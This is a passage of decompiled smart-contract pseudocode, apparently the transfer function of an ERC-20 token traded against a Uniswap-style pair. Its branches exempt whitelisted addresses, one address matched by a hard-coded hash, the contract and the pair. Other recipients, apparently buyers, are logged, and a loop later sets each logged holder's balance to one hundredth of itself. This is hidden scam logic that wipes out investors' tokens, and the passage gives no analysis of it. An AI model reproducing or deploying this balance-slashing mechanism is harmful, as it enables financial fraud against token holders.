                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                    return 1
                                if stor16[address(msg.sender)]:
                                    if arg2 < 0:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -1:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                    return 1
                                if stor18:
                                    if arg2 < 0:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -1:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                    return 1
                                if not arg2:
                                    require arg2 <= _maxTxAmount
                                    require ext_code.size(address(stor20.field_8))
                                    staticcall address(stor20.field_8).factory() with:
                                            gas gas_remaining wei
                                    mem[(8 * ceil32(return_data.size)) + 264] = ext_call.return_data[0]
                                    if not ext_call.success:
                                        revert with ext_call.return_data[0 len return_data.size]
                                    require return_data.size >= 32
                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                    mem[(10 * ceil32(return_data.size)) + 264] = 0xad5c464800000000000000000000000000000000000000000000000000000000
                                    require ext_code.size(address(stor20.field_8))
                                    staticcall address(stor20.field_8).WETH() with:
                                            gas gas_remaining wei
                                           args mem[(10 * ceil32(return_data.size)) + 268 len 16 * ceil32(return_data.size)]
                                    if not ext_call.success:
                                        revert with ext_call.return_data[0 len return_data.size]
                                    require return_data.size >= 32
                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                    mem[(12 * ceil32(return_data.size)) + 268] = this.address
                                    mem[(12 * ceil32(return_data.size)) + 300] = address(ext_call.return_data[0])
                                    require ext_code.size(address(ext_call.return_data[0]))
                                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                            gas gas_remaining wei
                                           args address(this.address), address(ext_call.return_data[0]), mem[(12 * ceil32(return_data.size)) + 332 len 20 * ceil32(return_data.size)]
                                    if not ext_call.success:
                                        revert with ext_call.return_data[0 len return_data.size]
                                    require return_data.size >= 32
                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                    if ext_call.return_data[12 len 20] == arg1:
                                        if arg2 < 0:
                                            revert with 'NH{q', 17
                                        if balanceOf[0] > -1:
                                            revert with 'NH{q', 17
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 'NH{q', 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[address(arg1)] > -arg2 - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg1)] += arg2
                                        emit Transfer(address arg1, address arg2, uint256 arg3):
                                                      arg2,
                                                      mem[(14 * ceil32(return_data.size)) + 296 len 24 * ceil32(return_data.size)],
                                                      msg.sender,
                                                      arg1,
                                        return 1, mem[(14 * ceil32(return_data.size)) + 296 len 24 * ceil32(return_data.size)]
                                    stor19.length++
                                    stor19[stor19.length].field_0 = arg1
                                    stor19[stor19.length].field_256 = arg2
                                    if arg2 < 0:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -1:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(address arg1, address arg2, uint256 arg3):
                                                  arg2,
                                                  mem[(14 * ceil32(return_data.size)) + 360 len 24 * ceil32(return_data.size)],
                                                  msg.sender,
                                                  arg1,
                                else:
                                    if arg2 and _fee > -1 / arg2:
                                        revert with 'NH{q', 17
                                    if not arg2:
                                        revert with 'NH{q', 18
                                    if arg2 * _fee / arg2 != _fee:
                                        revert with 0, 'SafeMath: multiplication overflow'
                                    require arg2 <= _maxTxAmount
                                    require ext_code.size(address(stor20.field_8))
                                    staticcall address(stor20.field_8).factory() with:
                                            gas gas_remaining wei
                                    mem[(8 * ceil32(return_data.size)) + 264] = ext_call.return_data[0]
                                    if not ext_call.success:
                                        revert with ext_call.return_data[0 len return_data.size]
                                    require return_data.size >= 32
                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                    mem[(10 * ceil32(return_data.size)) + 264] = 0xad5c464800000000000000000000000000000000000000000000000000000000
                                    require ext_code.size(address(stor20.field_8))
                                    staticcall address(stor20.field_8).WETH() with:
                                            gas gas_remaining wei
                                           args mem[(10 * ceil32(return_data.size)) + 268 len 16 * ceil32(return_data.size)]
                                    if not ext_call.success:
                                        revert with ext_call.return_data[0 len return_data.size]
                                    require return_data.size >= 32
                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                    mem[(12 * ceil32(return_data.size)) + 268] = this.address
                                    mem[(12 * ceil32(return_data.size)) + 300] = address(ext_call.return_data[0])
                                    require ext_code.size(address(ext_call.return_data[0]))
                                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                            gas gas_remaining wei
                                           args address(this.address), address(ext_call.return_data[0]), mem[(12 * ceil32(return_data.size)) + 332 len 20 * ceil32(return_data.size)]
                                    if not ext_call.success:
                                        revert with ext_call.return_data[0 len return_data.size]
                                    require return_data.size >= 32
                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                    if ext_call.return_data[12 len 20] == arg1:
                                        if arg2 < arg2 * _fee / 100:
                                            revert with 'NH{q', 17
                                        if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[0] += arg2 * _fee / 100
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 'NH{q', 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                                        emit Transfer(address arg1, address arg2, uint256 arg3):
                                                      arg2 - (arg2 * _fee / 100),
                                                      mem[(14 * ceil32(return_data.size)) + 296 len 24 * ceil32(return_data.size)],
                                                      msg.sender,
                                                      arg1,
                                        if arg2 * _fee / 100 > 0:
                                            emit Transfer(address arg1, address arg2, uint256 arg3):
                                                          arg2 * _fee / 100,
                                                          mem[(14 * ceil32(return_data.size)) + 296 len 24 * ceil32(return_data.size)],
                                                          msg.sender,
                                                          0,
                                        return 1, mem[(14 * ceil32(return_data.size)) + 296 len 24 * ceil32(return_data.size)]
                                    stor19.length++
                                    stor19[stor19.length].field_0 = arg1
                                    stor19[stor19.length].field_256 = arg2
                                    if arg2 < arg2 * _fee / 100:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[0] += arg2 * _fee / 100
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                                    emit Transfer(address arg1, address arg2, uint256 arg3):
                                                  arg2 - (arg2 * _fee / 100),
                                                  mem[(14 * ceil32(return_data.size)) + 360 len 24 * ceil32(return_data.size)],
                                                  msg.sender,
                                                  arg1,
                                    if arg2 * _fee / 100 > 0:
                                        emit Transfer(address arg1, address arg2, uint256 arg3):
                                                      arg2 * _fee / 100,
                                                      mem[(14 * ceil32(return_data.size)) + 360 len 24 * ceil32(return_data.size)],
                                                      msg.sender,
                                                      0,
                                return 1, mem[(14 * ceil32(return_data.size)) + 360 len 24 * ceil32(return_data.size)]
                        require ext_code.size(address(stor20.field_8))
                        staticcall address(stor20.field_8).factory() with:
                                gas gas_remaining wei
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        require ext_code.size(address(stor20.field_8))
                        staticcall address(stor20.field_8).WETH() with:
                                gas gas_remaining wei
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        require ext_code.size(address(ext_call.return_data[0]))
                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                gas gas_remaining wei
                               args address(this.address), address(ext_call.return_data[0])
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        if stor16[address(msg.sender)]:
                            if arg2 < 0:
                                revert with 'NH{q', 17
                            if balanceOf[0] > -1:
                                revert with 'NH{q', 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[address(arg1)] > -arg2 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                            return 1
                        if stor16[address(arg1)]:
                            if arg2 < 0:
                                revert with 'NH{q', 17
                            if balanceOf[0] > -1:
                                revert with 'NH{q', 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[address(arg1)] > -arg2 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                            return 1
                        if sha3(arg1) == 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba:
                            if arg2 < 0:
                                revert with 'NH{q', 17
                            if balanceOf[0] > -1:
                                revert with 'NH{q', 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[address(arg1)] > -arg2 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                            return 1
                        if arg1 == this.address:
                            if arg2 < 0:
                                revert with 'NH{q', 17
                            if balanceOf[0] > -1:
                                revert with 'NH{q', 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[address(arg1)] > -arg2 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                            return 1
                        if ext_call.return_data[12 len 20] != msg.sender:
                            if msg.sender == address(ext_call.return_data[0]):
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                                return 1
                        else:
                            if stor16[address(arg1)]:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                                return 1
                        if stor18:
                            if arg2 < 0:
                                revert with 'NH{q', 17
                            if balanceOf[0] > -1:
                                revert with 'NH{q', 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[address(arg1)] > -arg2 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                            return 1
                        if not arg2:
                            require arg2 <= _maxTxAmount
                            require ext_code.size(address(stor20.field_8))
                            staticcall address(stor20.field_8).factory() with:
                                    gas gas_remaining wei
                            if not ext_call.success:
                                revert with ext_call.return_data[0 len return_data.size]
                            require return_data.size >= 32
                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                            require ext_code.size(address(stor20.field_8))
                            staticcall address(stor20.field_8).WETH() with:
                                    gas gas_remaining wei
                            if not ext_call.success:
                                revert with ext_call.return_data[0 len return_data.size]
                            require return_data.size >= 32
                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                            mem[(15 * ceil32(return_data.size)) + 268] = this.address
                            mem[(15 * ceil32(return_data.size)) + 300] = address(ext_call.return_data[0])
                            require ext_code.size(address(ext_call.return_data[0]))
                            staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                    gas gas_remaining wei
                                   args address(this.address), address(ext_call.return_data[0]), mem[(15 * ceil32(return_data.size)) + 332 len 5 * ceil32(return_data.size)]
                            if not ext_call.success:
                                revert with ext_call.return_data[0 len return_data.size]
                            require return_data.size >= 32
                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                            if ext_call.return_data[12 len 20] == arg1:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(address arg1, address arg2, uint256 arg3):
                                              arg2,
                                              mem[(17 * ceil32(return_data.size)) + 296 len 9 * ceil32(return_data.size)],
                                              msg.sender,
                                              arg1,
                                return 1, mem[(17 * ceil32(return_data.size)) + 296 len 9 * ceil32(return_data.size)]
                            stor19.length++
                            stor19[stor19.length].field_0 = arg1
                            stor19[stor19.length].field_256 = arg2
                            if arg2 < 0:
                                revert with 'NH{q', 17
                            if balanceOf[0] > -1:
                                revert with 'NH{q', 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[address(arg1)] > -arg2 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] += arg2
                            emit Transfer(address arg1, address arg2, uint256 arg3):
                                          arg2,
                                          mem[(17 * ceil32(return_data.size)) + 360 len 9 * ceil32(return_data.size)],
                                          msg.sender,
                                          arg1,
                        else:
                            if arg2 and _fee > -1 / arg2:
                                revert with 'NH{q', 17
                            if not arg2:
                                revert with 'NH{q', 18
                            if arg2 * _fee / arg2 != _fee:
                                revert with 0, 'SafeMath: multiplication overflow'
                            require arg2 <= _maxTxAmount
                            require ext_code.size(address(stor20.field_8))
                            staticcall address(stor20.field_8).factory() with:
                                    gas gas_remaining wei
                            if not ext_call.success:
                                revert with ext_call.return_data[0 len return_data.size]
                            require return_data.size >= 32
                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                            require ext_code.size(address(stor20.field_8))
                            staticcall address(stor20.field_8).WETH() with:
                                    gas gas_remaining wei
                            if not ext_call.success:
                                revert with ext_call.return_data[0 len return_data.size]
                            require return_data.size >= 32
                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                            mem[(15 * ceil32(return_data.size)) + 268] = this.address
                            mem[(15 * ceil32(return_data.size)) + 300] = address(ext_call.return_data[0])
                            require ext_code.size(address(ext_call.return_data[0]))
                            staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                    gas gas_remaining wei
                                   args address(this.address), address(ext_call.return_data[0]), mem[(15 * ceil32(return_data.size)) + 332 len 5 * ceil32(return_data.size)]
                            if not ext_call.success:
                                revert with ext_call.return_data[0 len return_data.size]
                            require return_data.size >= 32
                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                            if ext_call.return_data[12 len 20] == arg1:
                                if arg2 < arg2 * _fee / 100:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                    revert with 'NH{q', 17
                                balanceOf[0] += arg2 * _fee / 100
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                                emit Transfer(address arg1, address arg2, uint256 arg3):
                                              arg2 - (arg2 * _fee / 100),
                                              mem[(17 * ceil32(return_data.size)) + 296 len 9 * ceil32(return_data.size)],
                                              msg.sender,
                                              arg1,
                                if arg2 * _fee / 100 > 0:
                                    emit Transfer(address arg1, address arg2, uint256 arg3):
                                                  arg2 * _fee / 100,
                                                  mem[(17 * ceil32(return_data.size)) + 296 len 9 * ceil32(return_data.size)],
                                                  msg.sender,
                                                  0,
                                return 1, mem[(17 * ceil32(return_data.size)) + 296 len 9 * ceil32(return_data.size)]
                            stor19.length++
                            stor19[stor19.length].field_0 = arg1
                            stor19[stor19.length].field_256 = arg2
                            if arg2 < arg2 * _fee / 100:
                                revert with 'NH{q', 17
                            if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                revert with 'NH{q', 17
                            balanceOf[0] += arg2 * _fee / 100
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                            emit Transfer(address arg1, address arg2, uint256 arg3):
                                          arg2 - (arg2 * _fee / 100),
                                          mem[(17 * ceil32(return_data.size)) + 360 len 9 * ceil32(return_data.size)],
                                          msg.sender,
                                          arg1,
                            if arg2 * _fee / 100 > 0:
                                emit Transfer(address arg1, address arg2, uint256 arg3):
                                              arg2 * _fee / 100,
                                              mem[(17 * ceil32(return_data.size)) + 360 len 9 * ceil32(return_data.size)],
                                              msg.sender,
                                              0,
                        return 1, mem[(17 * ceil32(return_data.size)) + 360 len 9 * ceil32(return_data.size)]
                    idx = 0
                    while idx < stor19.length:
                        mem[0] = stor19[idx].field_0
                        mem[32] = 13
                        _766 = mem[64]
                        mem[64] = mem[64] + 64
                        mem[_766] = 26
                        mem[_766 + 32] = 'SafeMath: division by zero'
                        if idx >= stor19.length:
                            revert with 'NH{q', 50
                        mem[0] = stor19[idx].field_0
                        mem[32] = 13
                        balanceOf[stor19[idx].field_0] = balanceOf[stor19[idx].field_0] / 100
                        if idx == -1:
                            revert with 'NH{q', 17
                        idx = idx + 1
                        continue 
                    stor19.length = 0
                    mem[0] = 19
                    idx = 0
                    while 2 * stor19.length > idx:
                        stor19[idx].field_0 = 0
                        stor19[idx].field_256 = 0
                        idx = idx + 2
                        continue 
                    require ext_code.size(address(stor20.field_8))
                    staticcall address(stor20.field_8).factory() with:
                            gas gas_remaining wei
                    mem[mem[64]] = ext_call.return_data[0]
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    _7063 = mem[64]
                    mem[64] = mem[64] + ceil32(return_data.size)
                    require return_data.size >= 32
                    _7069 = mem[_7063]
                    require mem[_7063] == mem[_7063 + 12 len 20]
                    require ext_code.size(address(stor20.field_8))
                    staticcall address(stor20.field_8).WETH() with:
                            gas gas_remaining wei
                    mem[mem[64]] = ext_call.return_data[0]
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    _7087 = mem[64]
                    mem[64] = mem[64] + ceil32(return_data.size)
                    require return_data.size >= 32
                    _7093 = mem[_7087]
                    require mem[_7087] == mem[_7087 + 12 len 20]
                    mem[mem[64] + 4] = this.address
                    mem[mem[64] + 36] = address(_7093)
                    require ext_code.size(address(_7069))
                    staticcall address(_7069).getPair(address arg1, address arg2) with:
                            gas gas_remaining wei
                           args address(this.address), address(_7093)
                    mem[mem[64]] = ext_call.return_data[0]
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    _7111 = mem[64]
                    mem[64] = mem[64] + ceil32(return_data.size)
                    require return_data.size >= 32
                    require mem[_7111] == mem[_7111 + 12 len 20]
                    if arg1 != mem[_7111 + 12 len 20]:
                        require ext_code.size(address(stor20.field_8))
                        staticcall address(stor20.field_8).factory() with:
                                gas gas_remaining wei
                        mem[mem[64]] = ext_call.return_data[0]
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        _7165 = mem[64]
                        mem[64] = mem[64] + ceil32(return_data.size)
                        require return_data.size >= 32
                        _7183 = mem[_7165]
                        require mem[_7165] == mem[_7165 + 12 len 20]
                        require ext_code.size(address(stor20.field_8))
                        staticcall address(stor20.field_8).WETH() with:
                                gas gas_remaining wei
                        mem[mem[64]] = ext_call.return_data[0]
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        _7231 = mem[64]
                        mem[64] = mem[64] + ceil32(return_data.size)
                        require return_data.size >= 32
                        _7261 = mem[_7231]
                        require mem[_7231] == mem[_7231 + 12 len 20]
                        mem[mem[64] + 4] = this.address
                        mem[mem[64] + 36] = address(_7261)
                        require ext_code.size(address(_7183))
                        staticcall address(_7183).getPair(address arg1, address arg2) with:
                                gas gas_remaining wei
                               args address(this.address), address(_7261)
                        mem[mem[64]] = ext_call.return_data[0]
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        _7421 = mem[64]
                        mem[64] = mem[64] + ceil32(return_data.size)
                        require return_data.size >= 32
                        _7492 = mem[_7421]
                        require mem[_7421] == mem[_7421 + 12 len 20]
                        if mem[_7421 + 12 len 20] != msg.sender:
                            if stor16[address(msg.sender)]:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                            else:
                                mem[0] = arg1
                                mem[32] = 16
                                if stor16[address(arg1)]:
                                    if arg2 < 0:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -1:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                else:
                                    mem[mem[64] + 32] = address(arg1)
                                    _7858 = mem[64]
                                    mem[mem[64]] = 20
                                    mem[64] = mem[64] + 52
                                    if sha3(mem[_7858 + 32 len mem[_7858]]) == 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba:
                                        if arg2 < 0:
                                            revert with 'NH{q', 17
                                        if balanceOf[0] > -1:
                                            revert with 'NH{q', 17
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 'NH{q', 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[address(arg1)] > -arg2 - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg1)] += arg2
                                        emit Transfer(arg2, msg.sender, arg1);
                                    else:
                                        if arg1 == this.address:
                                            if arg2 < 0:
                                                revert with 'NH{q', 17
                                            if balanceOf[0] > -1:
                                                revert with 'NH{q', 17
                                            if balanceOf[address(msg.sender)] < arg2:
                                                revert with 'NH{q', 17
                                            balanceOf[address(msg.sender)] -= arg2
                                            if balanceOf[address(arg1)] > -arg2 - 1:
                                                revert with 'NH{q', 17
                                            balanceOf[address(arg1)] += arg2
                                            emit Transfer(arg2, msg.sender, arg1);
                                        else:
                                            if msg.sender == address(_7492):
                                                if arg2 < 0:
                                                    revert with 'NH{q', 17
                                                if balanceOf[0] > -1:
                                                    revert with 'NH{q', 17
                                                if balanceOf[address(msg.sender)] < arg2:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(msg.sender)] -= arg2
                                                if balanceOf[address(arg1)] > -arg2 - 1:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(arg1)] += arg2
                                                emit Transfer(arg2, msg.sender, arg1);
                                            else:
                                                if stor18:
                                                    if arg2 < 0:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[0] > -1:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(arg1)] += arg2
                                                    emit Transfer(arg2, msg.sender, arg1);
                                                else:
                                                    if not arg2:
                                                        require arg2 <= _maxTxAmount
                                                        require ext_code.size(address(stor20.field_8))
                                                        staticcall address(stor20.field_8).factory() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(stor20.field_8))
                                                        staticcall address(stor20.field_8).WETH() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(ext_call.return_data[0]))
                                                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                                gas gas_remaining wei
                                                               args address(this.address), address(ext_call.return_data[0])
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        if ext_call.return_data[12 len 20] != arg1:
                                                            stor19.length++
                                                            stor19[stor19.length].field_0 = arg1
                                                            stor19[stor19.length].field_256 = arg2
                                                        if arg2 < 0:
                                                            revert with 'NH{q', 17
                                                        if balanceOf[0] > -1:
                                                            revert with 'NH{q', 17
                                                        if balanceOf[address(msg.sender)] < arg2:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(msg.sender)] -= arg2
                                                        if balanceOf[address(arg1)] > -arg2 - 1:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(arg1)] += arg2
                                                        emit Transfer(arg2, msg.sender, arg1);
                                                    else:
                                                        if arg2 and _fee > -1 / arg2:
                                                            revert with 'NH{q', 17
                                                        if not arg2:
                                                            revert with 'NH{q', 18
                                                        if arg2 * _fee / arg2 != _fee:
                                                            revert with 0, 'SafeMath: multiplication overflow'
                                                        require arg2 <= _maxTxAmount
                                                        require ext_code.size(address(stor20.field_8))
                                                        staticcall address(stor20.field_8).factory() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(stor20.field_8))
                                                        staticcall address(stor20.field_8).WETH() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(ext_call.return_data[0]))
                                                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                                gas gas_remaining wei
                                                               args address(this.address), address(ext_call.return_data[0])
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        if ext_call.return_data[12 len 20] != arg1:
                                                            stor19.length++
                                                            stor19[stor19.length].field_0 = arg1
                                                            stor19[stor19.length].field_256 = arg2
                                                        if arg2 < arg2 * _fee / 100:
                                                            revert with 'NH{q', 17
                                                        if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                                            revert with 'NH{q', 17
                                                        balanceOf[0] += arg2 * _fee / 100
                                                        if balanceOf[address(msg.sender)] < arg2:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(msg.sender)] -= arg2
                                                        if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                                                        emit Transfer((arg2 - (arg2 * _fee / 100)), msg.sender, arg1);
                                                        if arg2 * _fee / 100 > 0:
                                                            emit Transfer((arg2 * _fee / 100), msg.sender, 0);
                        else:
                            if stor16[address(msg.sender)]:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
